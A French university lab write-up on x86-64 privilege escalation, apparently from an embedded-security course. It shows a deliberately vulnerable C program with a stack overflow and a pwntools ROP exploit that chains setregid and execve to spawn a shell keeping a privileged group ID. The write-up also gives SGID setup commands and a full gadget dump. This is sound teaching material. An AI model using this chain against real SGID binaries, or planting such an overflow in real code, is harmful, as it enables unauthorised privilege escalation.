# Write-up — Lab 12 : Privilege Escalation via Syscall Chaining ROP

> **Embedded Security — C-ASM x86-64**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

[![Syscall Chaining](https://img.shields.io/badge/technique-syscall%20chaining-red.svg)]()
[![setregid](https://img.shields.io/badge/syscall-setregid%20%2B%20execve-orange.svg)]()
[![pwntools](https://img.shields.io/badge/pwntools-ROP%28%29-blue.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Contexte :** Buffer overflow sur binaire (potentiellement SGID)  
**Technique :** Enchaîner deux syscalls dans une seule ROP chain — `setregid` puis `execve`  
**Nouveauté vs Lab10 :** Plusieurs `do_syscall` dans une même chaîne ROP  
**Résultat :** Shell interactif — GID fixé par setregid avant spawn  
**Ref :** Exploit Development playlist — Video 6

---

## 2. Concept : syscall chaining

Dans les labs précédents, chaque ROP chain appelait **un seul syscall**. Ici, on en chaîne deux :

```
[gadgets syscall 1] → do_syscall → ret → [gadgets syscall 2] → do_syscall
```

Le `ret` à la fin de `do_syscall` (`syscall; ret`) tombe directement sur les gadgets du syscall suivant. On peut thus enchaîner autant de syscalls que nécessaire.

**Pourquoi setregid avant execve ?**

Sur un binaire SGID (Set Group ID), le processus a un `egid` élevé. Mais quand ce processus appelle `execve()` pour lancer un nouveau programme, l'egid peut être perdu si le shell enfant le réinitialise. `setregid(gid, gid)` fixe le **real** ET l'**effective** GID de façon permanente avant le spawn — le shell hérite ainsi des deux.

---

## 3. Code vulnérable — `target.c`

```c
#include <stdio.h>
#include <unistd.h>

__asm__(".section .text\n"
        ".global pop_rax\npop_rax:\n\tpop %rax\n\tret\n"
        ".global pop_rdi\npop_rdi:\n\tpop %rdi\n\tret\n"
        ".global pop_rsi\npop_rsi:\n\tpop %rsi\n\tret\n"
        ".global pop_rdx\npop_rdx:\n\tpop %rdx\n\tret\n"
        ".global do_syscall\ndo_syscall:\n\tsyscall\n\tret\n");

const char binsh[] = "/bin/sh";
const char arg_i[] = "-i";
const char* sh_argv[] = {binsh, arg_i, NULL};

void vulnerable() {
    char buffer[64];
    printf("uid=%d euid=%d gid=%d egid=%d\n",
           getuid(), geteuid(), getgid(), getegid());
    printf("Input : ");
    fflush(stdout);
    read(0, buffer, 200);
}

int main() { vulnerable(); return 0; }
```

---

## 4. Exploit — `exploit.py`

```python
from pwn import *

elf = ELF('./target')
context.binary = elf

TARGET_GID = 1001  # groupe cible (docker dans cet exemple)

rop = ROP(elf)

# Syscall 1 : setregid(TARGET_GID, TARGET_GID) — SYS_setregid = 114
rop.raw(elf.sym['pop_rax'])  ; rop.raw(114)
rop.raw(elf.sym['pop_rdi'])  ; rop.raw(TARGET_GID)
rop.raw(elf.sym['pop_rsi'])  ; rop.raw(TARGET_GID)
rop.raw(elf.sym['do_syscall'])           # ret → tombe sur syscall 2

# Syscall 2 : execve("/bin/sh", argv, NULL) — SYS_execve = 59
rop.raw(elf.sym['pop_rax'])  ; rop.raw(59)
rop.raw(elf.sym['pop_rdi'])  ; rop.raw(elf.sym['binsh'])
rop.raw(elf.sym['pop_rsi'])  ; rop.raw(elf.sym['sh_argv'])
rop.raw(elf.sym['pop_rdx'])  ; rop.raw(0)
rop.raw(elf.sym['do_syscall'])

payload = b'A' * 72 + rop.chain()
p.send(payload)
p.interactive()
```

---

## 5. Chaîne ROP complète

```
0x0000:  0x4011f6  pop_rax    → 0x72 (114 = SYS_setregid)
0x0010:  0x4011f8  pop_rdi    → 0x3e9 (1001 = docker gid)
0x0020:  0x4011fa  pop_rsi    → 0x3e9
0x0030:  0x4011fe  do_syscall → setregid(1001, 1001)
                               ↓ ret enchaîne
0x0038:  0x4011f6  pop_rax    → 0x3b (59 = SYS_execve)
0x0048:  0x4011f8  pop_rdi    → 0x402008 (/bin/sh)
0x0058:  0x4011fa  pop_rsi    → 0x404050 (sh_argv)
0x0068:  0x4011fc  pop_rdx    → 0x0
0x0078:  0x4011fe  do_syscall → execve("/bin/sh", ...)
```

---

## 6. Cas réel : binaire SGID

```bash
# Setup (nécessite root)
sudo chown root:docker ./target
sudo chmod g+s ./target

# Avant exploitation : egid = docker(1001)
# Sans setregid : shell enfant perd l'egid docker
# Avec setregid  : shell hérite gid=1001(docker)
```

---

## 7. Progression syscall ROP

| Lab | Technique | Syscalls |
| --- | --- | --- |
| Lab10 | ret2syscall | 1 × execve |
| Lab11 | mprotect + shellcode | 1 × mprotect |
| **Lab12** | **Syscall chaining** | **2 × (setregid + execve)** |

---

## Résumé technique

| Élément | Valeur |
| --- | --- |
| Nouveauté | Enchaîner 2 syscalls dans une ROP chain |
| Mécanisme | `ret` dans `do_syscall` tombe sur gadgets suivants |
| Syscall 1 | setregid (114) — fixe real et effective GID |
| Syscall 2 | execve (59) — spawn shell avec GID fixé |
| Usage réel | Binaire SGID — conserver les privilèges de groupe |

> Screenshot : [docs/lab12_privesc_syscall.png](docs/lab12_privesc_syscall.png)

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
